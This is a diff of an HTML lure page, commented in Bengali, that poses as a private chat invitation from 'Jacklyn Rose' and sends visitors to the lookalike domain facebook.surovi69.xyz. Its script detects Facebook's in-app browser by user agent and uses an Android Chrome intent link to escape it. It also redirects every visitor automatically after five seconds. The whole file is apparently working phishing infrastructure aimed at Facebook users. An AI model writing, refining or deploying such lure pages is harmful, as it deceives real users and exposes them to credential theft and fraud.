@@ -5,105 +5,58 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connect with Jacklyn</title>
     
-    <!-- ফেসবুক ডিবাগার ফিক্স (Open Graph Tags) -->
+    <!-- ফেসবুকের জন্য হিডেন মেটা ট্যাগ (ছবি না রাখলে এগুলো মাস্ট) -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://profile.surovi69.xyz/">
-    <meta property="og:title" content="Connect with Jacklyn">
-    <meta property="og:description" content="Join my official private chat room. Safe and Secure connection.">
-    
-    <!-- ImgBB Direct Links - ফেসবুকের জন্য ছবির সঠিক ফরম্যাট -->
+    <meta property="og:title" content="Join Private Room">
+    <meta property="og:description" content="Click the button to start a secure conversation.">
+    <!-- এখানে আপনার ImgBB লিঙ্কটি দিন যাতে ফেসবুকে প্রিভিউ দেখায় -->
     <meta property="og:image" content="https://i.ibb.co.com/fSn1f1q/profile.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
 
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body {
             margin: 0; padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             background-color: #f0f2f5;
             display: flex; justify-content: center; align-items: center; height: 100vh;
+            text-align: center;
         }
-        .bridge-card {
-            background: white; width: 90%; max-width: 400px;
-            border-radius: 15px; overflow: hidden;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center;
-        }
-        .cover-photo {
-            width: 100%; height: 120px;
-            /* আপনার দেওয়া কভার ফটোর ডিরেক্ট লিঙ্ক */
-            background: url('https://i.ibb.co.com/zNQrktR/cover.jpg') center/cover;
-        }
-        .profile-section { margin-top: -50px; padding: 20px; }
-        .img-container { position: relative; width: 100px; height: 100px; margin: 0 auto; }
-        .profile-img {
-            width: 100%; height: 100%; border-radius: 50%;
-            border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            object-fit: cover;
-        }
-        .online-dot {
-            height: 18px; width: 18px; background-color: #31a24c;
-            border: 3px solid white; border-radius: 50%;
-            position: absolute; bottom: 8px; right: 8px;
-            z-index: 2;
-        }
-        .name { font-size: 22px; font-weight: bold; color: #1c1e21; margin: 10px 0 5px; }
-        .bio { color: #65676b; font-size: 14px; margin-bottom: 20px; line-height: 1.4; }
-        .main-btn {
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 85%; max-width: 350px; }
+        .text { color: #1c1e21; font-size: 18px; margin-bottom: 20px; font-weight: 500; }
+        .btn {
             background-color: #0084FF; color: white; text-decoration: none;
-            padding: 15px 30px; border-radius: 10px; font-weight: bold;
-            display: inline-flex; align-items: center; gap: 10px;
-            width: 80%; justify-content: center; font-size: 16px; border: none; cursor: pointer;
+            padding: 12px 25px; border-radius: 8px; font-weight: bold;
+            display: block; font-size: 16px; transition: 0.3s;
         }
-        .footer-text { font-size: 12px; color: #bcc0c4; margin-top: 15px; padding-bottom: 15px; }
+        .loading { font-size: 12px; color: #65676b; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="bridge-card">
-        <div class="cover-photo"></div>
-        <div class="profile-section">
-            <div class="img-container">
-                <!-- প্রোফাইল ফটোর ডিরেক্ট লিঙ্ক -->
-                <img src="https://i.ibb.co.com/fSn1f1q/profile.jpg" alt="Profile" class="profile-img">
-                <span class="online-dot"></span>
-            </div>
-            <div class="name">Jacklyn Rose</div>
-            <div class="bio">
-                Hey there! I am waiting to start a private conversation with you. 
-                Click below to join my room.
-            </div>
-            
-            <a href="https://facebook.surovi69.xyz" class="main-btn" id="actionBtn">
-                <i class="fab fa-facebook-messenger"></i> Start Private Chat
-            </a>
-        </div>
-        <div class="footer-text">© 2026 Connect Plus | Safe & Secure</div>
+    <div class="container">
+        <div class="text">Connecting to secure server...</div>
+        
+        <a href="https://facebook.surovi69.xyz" class="btn" id="goBtn">Click to Start Chat</a>
+        
+        <div class="loading">Please wait, redirecting in 5 seconds...</div>
     </div>
 
     <script>
         const targetUrl = "https://facebook.surovi69.xyz";
         const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
 
-        function handleRedirect() {
-            // ফেসবুক বা মেসেঞ্জার অ্যাপ চেক
-            if (/FBAN|FBAV|Messenger/i.test(navigator.userAgent)) {
+        function redirect() {
+            if (/FBAN|FBAV/i.test(navigator.userAgent)) {
                 window.location.href = chromeIntent;
-                // যদি ইন্টেন্ট ফেল করে, তবে সাধারণ রিডাইরেক্ট
                 setTimeout(() => { window.location.href = targetUrl; }, 1000);
             } else {
                 window.location.href = targetUrl;
             }
         }
 
-        document.getElementById('actionBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            handleRedirect();
-        });
-
-        // ৫ সেকেন্ড পর অটো রিডাইরেক্ট হবে
+        // ৫ সেকেন্ড পর অটো রিডাইরেক্ট (নিরাপত্তার জন্য ২ সেকেন্ডের চেয়ে ৫ সেকেন্ড ভালো)
         window.onload = function() {
-            setTimeout(() => { handleRedirect(); }, 5000); 
+            setTimeout(redirect, 5000);
         };
     </script>
 </body>
